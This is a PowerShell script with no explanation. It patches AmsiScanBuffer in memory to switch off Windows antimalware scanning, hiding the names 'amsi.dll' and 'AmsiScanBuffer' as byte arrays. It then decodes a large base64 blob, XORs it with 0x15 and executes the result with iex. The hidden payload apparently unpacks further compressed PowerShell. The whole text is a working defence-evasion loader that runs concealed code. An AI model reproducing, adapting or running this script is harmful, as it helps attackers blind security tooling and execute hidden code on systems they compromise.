
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "c2B7dmF8ens1XHtjen5wOEZ9dGdlVnl8ZXd6dGdxGB9uGB8YHzU1NTUxdChbcGI4Wnd/cHZhNVxa
O1hweHpnbEZhZ3B0eD05TlZ6e2NwZ2FILy9TZ3p4V1RmUCMhRmFnfHtyPTddIWZcVFRUVFRUVFBU
WiRMdydidkdtQzpgJmY+Wj5zeHR/YWUhI0dfYH9+e3ZRUiwtICRhJWNtbyFmYHFdd2AkXUFxJmFy
YFBge2EmITpYJ3AiY00mQSZdZX9GfkBTVFlZQnpnQ1BUU1RCZyAlVmVWXFdDenJ0emEsVFhTLEdY
VmR0fUBHQHJDWUByYURjVn1yZXdzb1oiLC1HLFw+Z0N8b2NheCZ7Y28mZ2xPcHNFeH9Gdjo6clRl
R1dBVCwsICJHUD5HQyF3ZSVgQFZjY1YkRWJ7QX4gYXAnY1pAW0VdRnthbHwiZHJDJ2xnT0J5fmF0
Xk9lYEJkcGRNd0NDXUNBb09vXmR4QmdsWl53WyFzJz5/ZHhHIXJ4X1xNPnFwQU9vLHclY35MR3Rl
dkZAVCN+b3RFU0xiV2Rvd1d9Z2wkInFjWEZ3UU9eLGV6XiZzZSB6ciJtJCN/Z3lGfGNNUHElbHlz
IEZmZlJ+ImxDI1RlQG8jXXNvZmFMfiZlRyMjdFklck8tZ1R4RWAnb09HQSchJ08sTWBSUyZ+IWV3
ISJPf1MtfCZRQXRefE10ZiJyc2x2W214fXlNYndaQCdWJCRNZz5hJkxkJ09dQVJjXX1YfFl3RiF9
Pn94cWcgJ1hndjpgWXc6ZXZkV3Q6OmFiWW9EV3chJmN0LSJccH9McSIhQXlRY31PelMsImJ0fUVa
fSVycFdmVHF9JmF3QkNDLE9DcldMWFFhJlc+Ok1SXXZiflJbJVJEYCxgWnFncU1Fc1klcCUkfXcl
RWxxUHFEWkF6W0xRez50fUdyWlZdRVBfQCFgJHB6fCVffXN9I1Q+LEB6YX9ffll6WS1yRW8lQyR6
fSdvRF4tXSJMXERAJnYmeUJnf3FATX1NdltjW29nQnJhWXAnQnxne15TbH9Rd3BhYVNlIlpWXVZE
RD5UY0RffGFfTXdNdHNfRntEY2E6eVAsekxBUH0+cWNRJHRSemJ7IXJaX3JwRH1BeH59cj4tJn1g
ZiBBJkRzI2dhIFo+Y3RgeXlsbVEgYVx7elhxdixYU2ZzW3YhUnB+b0V/UnFEY1RFLV5DRXB2WF5s
LWNiLExUJ3lgRlsjI3xzY1daLFxULGJAPj54InN9c3xPICMjXTp0UiwmZ2dEeU0gcT4kZy1CZHR0
dD5PfndiT1dwfk8jRHJ5Rmctb30mPnInIEBnI1NDLUwnfCBhVD5Nd1RhIXlMXnNYIUcsUD4gLVZf
ckdmfnchUD5Wc3xmVnJ6WyVnWXZlUXBATSFRUlNFI1R+XSNfQSd9fVp9JD5DTVRwPn1DLF14QFpZ
dnI+e21BIGdUe0BUXi19QX0tUn9XUCJEZ2NzICEhOllNWGVHI1dTRX5vIE1aRiNcWUBEcWxXQHJe
IlZtckJdZX1WZ0ZEVz4hc2ZMQid+VF9bLU1yfXNXOiVwY1B5UHt8YXosZl99QmZdRm1gf0F4RWBM
Y1BFemMlVEVkJXBAbzp8Im9BUGV2WXFMdkQsWVciIFxZTU1memNsRF1sfiFxfHdiQ3FlUCVsZ11d
PmI+em9iViJXdFdFQG1dVH0tUyx/QHM+IWMtWUJWRVZwYlkmd1pMT0xyYGdmXnBTW397TFc6XXt5
OlM+IkVUTWRXT2x7WHNAWHlzUnA+WFhZXX8iRF1wYX5BIlBPeyJvRUwjR3ReTVNEInN+UXNHZ1Zf
R18mUiwnYlNRYVc+YnIgXFZdfVxiX3BWIXJRdl8+UVBXW3ZWZ0ZXc2EnYkN2UHNXV3pwJV1EY0VB
cVJxcldvJ0UsfCAjUHdUXS1QdkwhJU10UWIsIH5xIlJjZyxYPiBAPmB+YVw6Q1JmJSxxUz5iJCNU
V08tfW0jQVg6RCEmR0RMciMscG1bInFeb0FzRiBDVFd5XEVsQ3hYLXtxeUF7VDpsQkJtXngmTExP
Y3wkUCJzV3FtViZiWi19eSFWIl5dc1RNI1AmckR2UEVWXHJSeVdjIF1wV2ZiXmx8dlBZU1Z3U15w
byRUOnolXV1lQHdkUSJmcHFxISNSI1F5IFJeJX9mUk9MdHxQZVxTU1J0ZEAldGVcJyVAQz4mZEcn
WnJYLXZcUy1/I3pDfV9jIzp2cFl/ZXtHWmFkZ3x9cX1TXXxXb295I2dRVDp7LFJxfGRSYWVUJlt2
R1lvVkFlI35nfiBNUGddLWNYdngiRl5DTFhxeiJSIGR2by0gUHIneG96IER7WkEtPnhfLXB+QWUk
XntYb0VBeENHYH1YZVpid1xbRUAsb097XXRtfUJAQiJGT0NkR1MhWnlTJnNXdGFdclpcWWB6J09C
JXpDc2x5eExNdE9cIH95T3xDUllgOl99eFNyJFJ0dmElWVtET29CQCBjdm16b2FPcVtkUnd/WVlY
QUNAJSdsJW8lLScjIV5bb2B0XHdvUSJfQVJ0UUBQbCBWX38gXnlye2QmekF5eF0gdGR4fiBEJkJ6
UFMhQ3tzJUN3RkAhIldsJnl/XyNwI1JPU2ZnZmdfeHsnJ2J2ZXpbIyVwRyJnV29Df1p/X39YXlQn
cE8icHxCYE8jXydGInplRmVmJiBWcUxAIlckfGBneHEjfn12R2VPeH9ZemBCZlMtT3BTXmZTcSNb
V15sYCdNeWd2flNCYHRaT15yJlIjdGdnTFdAUyYsd21gI1Ihb3kieUMnIG9Df1Zld2YiQ21hcm9G
fGBabHZhb29XLG1/W0xeY1taIWNWPnN+WVo+ZFwjRXxbIn1FQVF6eXJ5RVojQndHWmZxcXYhXk9f
TXBHZHIjb1c6Z39HdkVyOmBZdHlgUmdlfHtZJEdzJXJ5fEFAdmZgJSNGeHgmRlFXQ1YmZ3d+RWVG
ekN6LHRgeHZ2QlFTTERTU31ee38le2RjV35PeVpkQl5iZyFyW3oiekRaXnNyc21EYGBtdFJ6bX4k
JidnQ2def1ojQ39cYW0sQFlRfiR9ZlZAJ2xxbVNkPnxmTUdeXFhxYGRPX3gsZVdzTFp7d1shcGEt
byJTfV0lIWdAUX1/TXZPd1tGc1pnTUEhWnhSQnFWZTpSI3dSfyxeJU9gWHZ8d1ggbXYiIHhReGVZ
dHZhUVpMc0x9Ym8nIyZjXCUsTDpHfG1weWNQT2YnIX1Ge2ddUnFyR1N0bHp0d3pxR11mYVN3R1Zj
VHBSfHlNTVcjISV4e3ZcbU1QWFdCJm9HXD5QJnBFRn5CJU1dYlNUTGBydFxfPldsTXpBYUdHeGRQ
dlxgJD5EYCEkflB3cGVQW1ldZ3olR1JjcEVsQ35xdFNBZUF4JUFbVGFHW2NROl9nIi1QTGwmV09B
f1h/fUxzLSM6XV4jPllYJnNlcnc6LXdtTTpvJ3t8JiZNJX5XQ09ZdFNfQn5Tf0QjWm9+dCB+VkJy
PlBCQ09PJ3F7W1J5bHdMWmZeICRRQl8jV2BSRl1wYkNwI3YjR2VXZmIkR2BdWnh9QkRlY1dbelJe
JGJaV21UIiZURHJ9J3FbIk0sPlNbe09ndkVje09jclpwek1dJ3ddWm1SUSJ+d3t3YCJgJGFfdHBj
YFJ6UHhkdCV3TXN/XWdiLGVDIn1bLWdaXyZBbG1sdnlNbyx5dE92emxHIExZQVxERndWJi1Eflw6
WSNzd1x5UyFBQldSd2ZMICdsQWRkfnZZLHBwRWQnZTpce3hEdFksUHBiLHFFJn1iZlE+T39UJHAm
Ji1yW2V/ZkVtRCJwUFFBTH1lWV9cY18jYi12RmBGR0dTYn1AQmZGfEYgPkZffn4nfXhzUmZ7Q3o+
QyRzckRMRH9fLVxfI1BhcFJhcXRPOkVAJVcmdmR5JFFlXVN3JVFkPixWTWFMLXxsckR0IkcmJCwj
RVIgRlpCUVgneyJ3Zn5CQHhcenAhJldyQXpMdE0sOnRHWmdsbX5yLFB+dkB0ZH59Uy1xVnx0cC0k
JkNGLVMtb1dRcHwtZ1ZdQj5sOj55OiNjYlJmc1JYdyJNJ3liX2VHV2JTe35BOlpUXCZEdGdNUi0l
XnBUf2JaWnBkLCRwfHdiJGdgW3klZVEgJlBzVixRdHdcfnpcJ3xvIWFGRVxyTExaWjp/WkVQWVxk
RXlnYlhgeURbTVQsQFdNbVpHfVh2UmcmYjp2X1A6Z1JWQXwkIS1mZUQnJV1GRSNfWno6YkxHdD5R
OmFQWmZXIS0kT3NsLUJaRSF4fFtbY1x6THNiQm8kQEY6Qn17U1YlJ2R/IHNXIGxRQidGXnRbcWBP
bUxnb1pDT3pzdG9/X0xQXCVxVG98LT5SZXpPLVB/eWd6YyJtdndwcjoicnNcQiZAUnxEdyRjJ2Mt
cFl6ZnBvRUxMbCN6UnZWQlB5emRbJVRzVEx5I1pXY386QCVTT3gifHktOndQeWwmI1twZkNMW0Vx
I1otT2B/WVBMLEIkLENyZU12LHlaPkVhJyZjQU8mLSYmRSFPf0xyJ3tEWU1WZCFkIGUmZHFZZ3Mn
ckJFY0MteGEmTFomI11tRGxec0dibVdvbyVYb2NvQGNfOkFDWyxSd0FcTX9nZS0tcEV3IHZbYUR5
RT4gUlBfZn9ef1hZU2Y6RX18XG9gcV1MYkx/ZGBQf1JbdlhsJ0NXfn1BeEchLXYnfW90XX94ZT55
ZH1WfXB+WEdPUSJdTUxefC18XHtDfU9ZLHxCTGwnIWZMX0NFZGIgIHN9RlhkXkJbQ1tzTFwhIidv
YnB5XnlkTXF5IVBMfl0tel9DW2NTc0dRQEciIXZ8fmxhW1pDZXZkJER8c08hUiQjISMiZ3wgTFMn
eEVzJnBsX1clQl5SXk8tQl5/IVt8ZixgZ2ZfRX1XdFhjXHZYZFhwdmxhRCBQI3lkdCxwVFZeQ0Yg
bUdbZnxHeGRicFNER11FUm9GTWdZWVh/dHlDRVNPUVdMTFRTb01WTEVseH1lUi1RdCdkeCwjJ2w6
Qn1zc0dSVF0+J2dZcHptYGNsfHBjPkVGcmwsUSB7OnliLFg+RD5MQE1zLVRXclRUVCgoNzw8GB81
NTU1MXFwdnp4ZWdwZmZwcTUoNVtwYjhad39wdmE1XFo7Vnp4ZWdwZmZ8ens7Um98ZUZhZ3B0eD0x
dDlOXFo7Vnp4ZWdwZmZ8ens7VnpYRWdwZmZ8entYenFwSC8vUVBWenhFZ3BmZjwYHzU1NTUxemBh
ZWBhNSg1W3BiOFp3f3B2YTVGbGZhcHg7XFo7WHB4emdsRmFncHR4GB81NTU1MXFwdnp4ZWdwZmZw
cTtWemVsQXo9NTF6YGFlYGE1PBgfNTU1NU53bGFwTkhINTF3bGFwWmBhVGdndGw1KDUxemBhZWBh
O0F6VGdndGw9PBgfNTU1NTFHVEY1KDVORmxmYXB4O0dwc3lwdmF8ens7VGZmcHh3eWxILy9ZenRx
PTF3bGFwWmBhVGdndGw8GB8YHzU1NTUxWnlxVnp7Znp5cFpgYTUoNU5WentmenlwSC8vWmBhGB81
NTU1MUZhZ3x7ckJnfGFwZzUoNVtwYjhad39wdmE1XFo7RmFnfHtyQmd8YXBnGB81NTU1TlZ6e2Z6
eXBILy9GcGFaYGE9MUZhZ3x7ckJnfGFwZzwYHxgfNTU1NU5WeXxld3p0Z3FbemF8c3x2dGF8entI
Ly9YdHx7PTc3PBgfGB81NTU1TlZ6e2Z6eXBILy9GcGFaYGE9MVp5cVZ6e2Z6eXBaYGE8GB81NTU1
MUdwZmB5YWY1KDUxRmFnfHtyQmd8YXBnO0F6RmFnfHtyPTwYHzU1NTUxR3BmYHlhZhgfNTUYH2gY
Hw=="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x15}
iex ([System.Text.Encoding]::ASCII.GetString($data))

